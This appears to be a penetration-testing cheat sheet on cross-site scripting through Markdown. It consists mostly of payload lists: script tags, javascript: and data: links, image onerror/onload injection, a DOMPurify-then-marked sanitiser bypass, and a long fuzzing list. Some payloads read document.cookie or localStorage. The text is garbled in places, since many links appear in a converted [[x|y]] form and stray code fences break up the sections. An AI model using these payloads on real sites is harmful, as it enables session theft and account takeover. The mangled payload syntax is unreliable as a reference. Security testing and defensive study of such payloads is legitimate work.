# XSS in Markdown


If you have the chance to inject code in markdown, there are a few options you can use to trigger a XSS when the code gets interpreted.

### HTML tags

The most common way to get XSS in markdown is to inject common HTML tags that execute javascript, because several makdown interpreters will also accept HTML

```html
<!-- XSS with regular tags -->
<script>
  alert(1)
</script>
![[x|]]
```
```
You can find more examples in the [[README.md|main XSS page of hacktricks]].

### Javascript links

If HTML tags aren't an option you could always try to play with markdown syntax:

```html
<!-- markdow link to XSS, this usually always work but it requires interaction -->
[[javascript:prompt(document.cookie)|a]]

<!-- Other links attacks with some bypasses -->
[[javascript:alert('Basic')|Basic]] [[javascript:alert(JSON.stringify(localStorage))|Local
Storage]]
[[JaVaScRiPt:alert('CaseInsensitive')|CaseInsensitive]]
[[javascript://www.google.com%0Aalert('URL')|URL]] [['javascript:alert("InQuotes")'|In
Quotes]] [a](j a v a s c r i p
t:prompt(document.cookie))
[[data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K|a]]
[[javascript:window.onerror=alert;throw%201|a]]
```
```
### Img event syntax abuse

```markdown
![[<"onerror="alert('XSS')>|Uh oh...]]
![[<https://www.example.com/image.png"onload="alert('XSS')>|Uh oh...]]
![[<https://www.example.com/image.png"onload="alert('ImageOnLoad')>|Escape SRC - onload]]
![[<"onerror="alert('ImageOnError')>|Escape SRC - onerror]]
```
```
### HTML Sanitiser Markdown Bypass

The following code is **sanitising HTML input** and then **passing it to the markdown parser**, then, XSS can be triggered abusing miss-interpretations between Markdown and DOMPurify

```html
<!--from https://infosecwriteups.com/clique-writeup-%C3%A5ngstromctf-2022-e7ae871eaa0e -->

<script>
  const qs = new URLSearchParams(location.search)
  if (qs.get("content")?.length > 0) {
    document.body.innerHTML = marked.parse(
      DOMPurify.sanitize(qs.get("content"))
    )
  }
</script>
```
```
Payloads example:

```html
<div
  id="1

![[contenteditable/autofocus/onfocus=confirm('qwq')//index.html|]]">
  -----------------------------------------------
  <a
    title="a

<img src=x onerror=alert(1)>"
    >yep</a
  >
  ------------------------------------------------ [x](y '<style>
    ')<!--
  </style>
  
  ---------------------------------------------- [
  
  ) ---------------------------------------------- 
  
</div>
```
```
### Fuzzing

```html
<!--
Fuzzing examples from
- [[https://github.com/cujanovic/Markdown-XSS-Payloads/blob/master/Markdown-XSS-Payloads.txt|https://github.com/cujanovic/Markdown-XSS-Payloads/blob/master/Markdown-XSS-Payloads.txt]]
- [[https://makandracards.com/makandra/481451-testing-for-xss-in-markdown-fields|https://makandracards.com/makandra/481451-testing-for-xss-in-markdown-fields]]
-->

[[javascript:prompt(document.cookie)|a]]
[[j    a   v   a   s   c   r   i   p   t:prompt(document.cookie)|a]]
![[javascript:prompt(document.cookie)|a]]\
<javascript:prompt(document.cookie)>
<javascript:alert('XSS')>
  ![[data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K|a]]\
[[data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K|a]]
[[javascript:alert('XSS')|a]]
![[x|a'"onerror=prompt(document.cookie)]]\
[lol]: (javascript:prompt(document.cookie))
[[javascript:window.onerror=alert;throw%20document.cookie|notmalicious]]
[[javascript://%0d%0aprompt(1)|test]]
[[javascript://%0d%0aprompt(1);com|test]]
[[javascript:window.onerror=alert;throw%20document.cookie|notmalicious]]
[[javascript://%0d%0awindow.onerror=alert;throw%20document.cookie|notmalicious]]
[[data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K|a]]
[[vbscript:alert(document.domain)|clickme]]
_http://danlec_@.1 style=background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAABACAMAAADlCI9NAAACcFBMVEX/AAD//////f3//v7/0tL/AQH/cHD/Cwv/+/v/CQn/EBD/FRX/+Pj/ISH/PDz/6Oj/CAj/FBT/DAz/Bgb/rq7/p6f/gID/mpr/oaH/NTX/5+f/mZn/wcH/ICD/ERH/Skr/3Nz/AgL/trb/QED/z8//6+v/BAT/i4v/9fX/ZWX/x8f/aGj/ysr/8/P/UlL/8vL/T0//dXX/hIT/eXn/bGz/iIj/XV3/jo7/W1v/wMD/Hh7/+vr/t7f/1dX/HBz/zc3/nJz/4eH/Zmb/Hx//RET/Njb/jIz/f3//Ojr/w8P/Ghr/8PD/Jyf/mJj/AwP/srL/Cgr/1NT/5ub/PT3/fHz/Dw//eHj/ra3/IiL/DQ3//Pz/9/f/Ly//+fn/UFD/MTH/vb3/7Oz/pKT/1tb/2tr/jY3/6en/QkL/5OT/ubn/JSX/MjL/Kyv/Fxf/Rkb/sbH/39//iYn/q6v/qqr/Y2P/Li7/wsL/uLj/4+P/yMj/S0v/GRn/cnL/hob/l5f/s7P/Tk7/WVn/ior/09P/hYX/bW3/GBj/XFz/aWn/Q0P/vLz/KCj/kZH/5eX/U1P/Wlr/cXH/7+//Kir/r6//LS3/vr7/lpb/lZX/WFj/ODj/a2v/TU3/urr/tbX/np7/BQX/SUn/Bwf/4uL/d3f/ExP/y8v/NDT/KSn/goL/8fH/qan/paX/2Nj/HR3/4OD/VFT/Z2f/SEj/bm7/v7//RUX/Fhb/ycn/V1f/m5v/IyP/xMT/rKz/oKD/7e3/dHT/h4f/Pj7/b2//fn7/oqL/7u7/2dn/TEz/Gxv/6ur/3d3/Nzf/k5P/EhL/Dg7/o6P/UVHe/LWIAAADf0lEQVR4Xu3UY7MraRRH8b26g2Pbtn1t27Zt37Ft27Zt6yvNpPqpPp3GneSeqZo3z3r5T1XXL6nOFnc6nU6n0+l046tPruw/+Vil/C8tvfscquuuOGTPT2ZnRySwWaFQqGG8Y6j6Zzgggd0XChWLf/U1OFoQaVJ7AayUwPYALHEM6UCWBDYJbhXfHjUBOHvVqz8YABxfnDCArrED7jSAs13Px4Zo1jmA7eGEAXvXjRVQuQE4USWqp5pNoCthALePFfAQ0OcchoCGBAEPgPGiE7AiacChDfBmjjg7DVztAKRtnJsXALj/Hpiy2B9wofqW9AQAg8Bd8VOpCR02YMVEE4xli/L8AOmtQMQHsP9IGUBZedq/AWJfIez+x4KZqgDtBlbzon6A8GnonOwBXNONavlmUS2Dx8XTjcCwe1wNvGQB2gxaKhbV7Ubx3QC5bRMUuAEvA9kFzzW3TQAeVoB5cFw8zQUGPH9M4LwFgML5IpL6BHCvH0DmAD3xgIUpUJcTmy7UQHaV/bteKZ6GgGr3eAq4QQEmWlNqJ1z0BeTvgGfz4gAFsDXfUmbeAeoAF0OfuLL8C91jHnCtBchYq7YzsMsXIFkmDDsBjwBfi2o6GM9IrOshIp5mA6vc42Sg1wJMEVUJlPgDpBzWb3EAVsMOm5m7Hg5KrAjcJJ5uRn3uLAvosgBrRPUgnAgApC2HjtpRwFTneZRpqLs6Ak+Lp5lAj9+LccoCzLYPZjBA3gIGRgHj4EuxewH6JdZhKBVPM4CL7rEIiKo7kMAvILIEXplvA/bCR2JXAYMSawtkiqfaDHjNtYVfhzJJBvBGJ3zmADhv6054W71ZrBNvHZDigr0DDCcFkHeB8wog70G/2LXA+xIrh03i02Zgavx0Blo+SA5Q+yEcrVSAYvjYBhwEPrEoDZ+KX20wIe7G1ZtwTJIDyMYU+FwBeuGLpaLqg91NcqnqgQU9Yre/ETpzkwXIIKAAmRnQruboUeiVS1cHmF8pcv70bqBVkgak1tgAaYbuw9bj9kFjVN28wsJvxK9VFQDGzjVF7d9+9z1ARJIHyMxRQNo2SDn2408HBsY5njZJPcFbTomJo59H5HIAUmIDpPQXVGS0igfg7detBqptv/0ulwfIbbQB8kchVtNmiQsQUO7Qru37jpQX7WmS/6YZPXP+LPprbVgC0ul0Op1Op9Pp/gYrAa7fWhG7QQAAAABJRU5ErkJggg==);background-repeat:no-repeat;display:block;width:100%;height:100px; onclick=alert(unescape(/Oh%20No!/.source));return(false);//
<http://\<meta\ http-equiv=\"refresh\"\ content=\"0;\ url=http://danlec.com/\"\>>
[[http://danlec.com " [@danlec](/danlec) "|text]]
[[javascript:this;alert(1)|a]]
[[javascript:this;alert(1&#41;|a]]
[[javascript&#58this;alert(1&#41;|a]]
[[Javas&#99;ript:alert(1&#41;|a]]
[[Javas%26%2399;ript:alert(1&#41;|a]]
[[javascript:alert&#65534;(1&#41;|a]]
[[javascript:confirm(1|a]]
[[javascript://www.google.com%0Aprompt(1)|a]]
[[javascript://%0d%0aconfirm(1);com|a]]
[[javascript:window.onerror=confirm;throw%201|a]]
[[javascript:alert(document.domain&#41;|a]]
[[javascript://www.google.com%0Aalert(1)|a]]
[['javascript:alert("1")'|a]]
[[JaVaScRiPt:alert(1)|a]]
![[https://www.google.com/image.png"onload="alert(1)|a]]
![["onerror="alert(1)|a]]
</http://<?php\><\h1\><script:script>confirm(2)
[[.alert(1);|XSS]]
[[https://a.de?p=[[/data-x=. style=background-color:#000000;z-index:999;width:100%;position:fixed;top:0;left:0;right:0;bottom:0; data-y=.]]| ]]
[[http://a?p=[[/onclick=alert(0) .]]| ]]
[[javascript:new%20Function`al\ert\`1\``;|a]]
[[javascript:prompt(document.cookie)|XSS]]
[[j    a   v   a   s   c   r   i   p   t:prompt(document.cookie)|XSS]]
[[data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K|XSS]]
[[javascript:alert('XSS')|XSS]]
[XSS]: (javascript:prompt(document.cookie))
[[javascript:window.onerror=alert;throw%20document.cookie|XSS]]
[[javascript://%0d%0aprompt(1)|XSS]]
[[javascript://%0d%0aprompt(1);com|XSS]]
[[javascript:window.onerror=alert;throw%20document.cookie|XSS]]
[[javascript://%0d%0awindow.onerror=alert;throw%20document.cookie|XSS]]
[[data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K|XSS]]
[[vbscript:alert(document.domain)|XSS]]
[[javascript:this;alert(1)|XSS]]
[[javascript:this;alert(1&#41;|XSS]]
[[javascript&#58this;alert(1&#41;|XSS]]
[[Javas&#99;ript:alert(1&#41;|XSS]]
[[Javas%26%2399;ript:alert(1&#41;|XSS]]
[[javascript:alert&#65534;(1&#41;|XSS]]
[[javascript:confirm(1|XSS]]
[[javascript://www.google.com%0Aprompt(1)|XSS]]
[[javascript://%0d%0aconfirm(1);com|XSS]]
[[javascript:window.onerror=confirm;throw%201|XSS]]
[[ï¿½javascript:alert(document.domain&#41;|XSS]]
![[javascript:prompt(document.cookie)|XSS]]\
![[data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K|XSS]]\
![[x|XSS'"onerror=prompt(document.cookie)]]\
```
```


